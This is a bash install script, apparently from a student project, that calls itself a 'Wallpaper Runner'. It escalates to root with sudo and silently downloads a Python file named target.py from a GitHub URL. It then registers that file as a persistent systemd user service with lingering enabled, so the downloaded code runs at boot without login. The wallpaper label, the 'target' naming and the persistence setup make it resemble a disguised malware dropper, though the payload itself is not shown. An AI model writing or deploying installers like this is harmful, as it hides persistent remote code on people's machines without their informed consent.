#!/bin/bash

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "[*] Re-running as root using sudo..."
  exec sudo "$0" "$@"
fi

echo "[*] Installing Wallpaper Runner..."

# Config
INSTALL_DIR="/home/$SUDO_USER/.wallpaper_runner"
SCRIPT_URL="https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
PYTHON=$(which python3)

# Create directory
mkdir -p "$INSTALL_DIR"
curl -sL "$SCRIPT_URL" -o "$INSTALL_DIR/target.py"
chown "$SUDO_USER":"$SUDO_USER" -R "$INSTALL_DIR"

# Systemd user service
SERVICE_DIR="/home/$SUDO_USER/.config/systemd/user"
mkdir -p "$SERVICE_DIR"
chown -R "$SUDO_USER":"$SUDO_USER" "$SERVICE_DIR"

cat <<EOF > "$SERVICE_DIR/wallpaper-runner.service"
[Unit]
Description=Wallpaper Runner Service
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON $INSTALL_DIR/target.py
Restart=on-failure

[Install]
WantedBy=default.target
EOF

chown "$SUDO_USER":"$SUDO_USER" "$SERVICE_DIR/wallpaper-runner.service"

# Enable lingering if needed
if ! loginctl show-user "$SUDO_USER" | grep -q 'Linger=yes'; then
  echo "[*] Enabling lingering for $SUDO_USER..."
  loginctl enable-linger "$SUDO_USER"
fi

# Reload and enable service
sudo -u "$SUDO_USER" systemctl --user daemon-reexec
sudo -u "$SUDO_USER" systemctl --user daemon-reload
sudo -u "$SUDO_USER" systemctl --user enable wallpaper-runner
sudo -u "$SUDO_USER" systemctl --user start wallpaper-runner

echo "[+] Installed Wallpaper Runner as a systemd user service."
